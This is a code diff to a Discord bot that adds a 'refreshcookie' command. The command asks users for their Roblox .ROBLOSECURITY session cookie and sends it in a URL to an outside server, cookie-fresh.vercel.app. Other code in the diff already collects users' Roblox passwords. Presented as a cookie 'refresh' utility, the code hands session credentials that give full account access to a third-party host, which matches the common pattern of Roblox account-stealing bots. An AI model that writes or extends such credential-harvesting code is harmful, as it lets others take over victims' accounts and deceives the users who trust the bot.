@@ -34,6 +34,14 @@ client.on('ready', async () => {
         option.setName('password')
           .setDescription('Your Roblox password')
           .setRequired(true)
+      ),
+    new SlashCommandBuilder()
+      .setName('refreshcookie')
+      .setDescription('Refresh your Roblox cookie')
+      .addStringOption(option =>
+        option.setName('cookie')
+          .setDescription('Your old .ROBLOSECURITY cookie')
+          .setRequired(true)
       )
   ].map(cmd => cmd.toJSON());
 
@@ -114,6 +122,47 @@ client.on('interactionCreate', async interaction => {
         .setColor(0xfacc15)
         .setTitle("🚫 Request Failed")
         .setDescription("Request blocked or failed to fetch data.");
+      await interaction.followUp({ embeds: [embed] });
+    }
+  }
+
+  if (interaction.commandName === 'refreshcookie') {
+    const cookie = interaction.options.getString('cookie');
+    await interaction.reply({ content: '🔄 Refreshing your cookie...', ephemeral: true });
+
+    try {
+      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0',
+          'Accept': 'application/json'
+        }
+      });
+
+      const data = await res.json();
+
+      if (!data.success) {
+        const embed = new EmbedBuilder()
+          .setColor(0xef4444)
+          .setTitle('❌ Refresh Failed')
+          .setDescription(data.error || 'Unknown error during cookie refresh.');
+
+        return await interaction.followUp({ embeds: [embed] });
+      }
+
+      const embed = new EmbedBuilder()
+        .setColor(0x22c55e)
+        .setTitle('✅ Cookie Refreshed')
+        .setDescription(`\`\`\`${data.refreshedCookie}\`\`\``)
+        .setFooter({ text: 'Keep it safe. Don’t share your cookie.' });
+
+      await interaction.followUp({ embeds: [embed] });
+
+    } catch (err) {
+      const embed = new EmbedBuilder()
+        .setColor(0xfacc15)
+        .setTitle("🚫 Request Failed")
+        .setDescription("Failed to reach the cookie refresh server.");
+
       await interaction.followUp({ embeds: [embed] });
     }
   }
